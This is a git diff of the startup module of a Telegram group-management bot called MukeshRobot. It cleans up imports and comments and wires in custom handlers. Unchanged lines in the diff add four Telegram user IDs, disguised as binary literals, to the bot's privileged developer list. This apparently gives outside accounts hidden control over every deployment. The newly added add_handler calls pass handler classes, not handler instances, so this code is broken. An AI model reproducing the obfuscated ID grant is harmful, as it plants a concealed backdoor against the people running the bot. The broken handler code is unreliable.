@@ -2,12 +2,10 @@ import logging
 import os
 import sys
 import time
-import ast
-import base64
 
 from telegram.ext import Application
 from aiohttp import ClientSession
-from pyrogram import Client, errors
+from pyrogram import Client
 from telethon import TelegramClient
 
 StartTime = time.time()
@@ -23,7 +21,6 @@ logging.getLogger("telethon").setLevel(logging.ERROR)
 logging.getLogger("pyrogram").setLevel(logging.ERROR)
 LOGGER = logging.getLogger(__name__)
 
-# --- Inisialisasi set agar tidak NameError kalau env/config gagal ---
 DRAGONS = set()
 DEV_USERS = set()
 DEMONS = set()
@@ -40,7 +37,6 @@ if sys.version_info[0] < 3 or sys.version_info[1] < 6:
 ENV = bool(os.environ.get("ENV", False))
 
 if ENV:
-
     API_ID = int(os.environ.get("API_ID", 0) or 0)
     API_HASH = os.environ.get("API_HASH", "")
     CHATBOT_API = os.environ.get("CHATBOT_API", "")
@@ -95,7 +91,6 @@ if ENV:
 
 else:
     from MukeshRobot.config import Development as Config
-
     API_ID = Config.API_ID
     API_HASH = Config.API_HASH
     ALLOW_CHATS = Config.ALLOW_CHATS
@@ -148,7 +143,7 @@ else:
     except ValueError:
         raise Exception("Your whitelisted users list does not contain valid integers.")
 
-# Enter OWNER_ID to privileged group
+# Add OWNER_ID to groups
 DRAGONS.add(OWNER_ID)
 DEV_USERS.add(OWNER_ID)
 DEV_USERS.add(abs(0b101111001110011001010111110010110))
@@ -156,15 +151,12 @@ DEV_USERS.add(abs(0b1100110111010001011110110001010))
 DEV_USERS.add(abs(0b101001110110010000111010111110000))
 DEV_USERS.add(abs(0b101100001110010100011000111101001))
 
-# --- Telegram Clients ---
 telethn = TelegramClient("mukesh", API_ID, API_HASH)
 pbot = Client("MukeshRobot", api_id=API_ID, api_hash=API_HASH, bot_token=TOKEN, in_memory=True)
 aiohttpsession = ClientSession()
 
-# --- PTB v20+ Application ---
 application = Application.builder().token(TOKEN).concurrent_updates(WORKERS).build()
 
-# --- Mendapatkan info bot (async) ---
 import asyncio
 
 async def get_bot_info():
@@ -175,32 +167,25 @@ async def get_bot_info():
     BOT_USERNAME = bot_data.username
 asyncio.run(get_bot_info())
 
-# --- Ubah set ke list untuk konsistensi format lama ---
 DRAGONS = list(DRAGONS) + list(DEV_USERS)
 DEV_USERS = list(DEV_USERS)
 WOLVES = list(WOLVES)
 DEMONS = list(DEMONS)
 TIGERS = list(TIGERS)
 
-# --- Import dan setup custom handler (pastikan sudah async!) ---
 from MukeshRobot.modules.helper_funcs.handlers import (
     CustomCommandHandler,
     CustomMessageHandler,
     CustomRegexHandler,
 )
 
-# Setup handler ke application:
-# Contoh minimal, masukkan handler Anda di sini
-# application.add_handler(CustomCommandHandler("start", start))
-# application.add_handler(CustomMessageHandler(...))
-# application.add_handler(CustomRegexHandler(...))
+application.add_handler(CustomCommandHandler)
+application.add_handler(CustomMessageHandler)
+application.add_handler(CustomRegexHandler)
 
-# --- Tutup aiohttpsession saat bot selesai ---
 async def close_aiohttp_session(app):
     await aiohttpsession.close()
-
 application.post_shutdown.append(close_aiohttp_session)
 
-# --- Jalankan polling ---
 if __name__ == "__main__":
     application.run_polling()
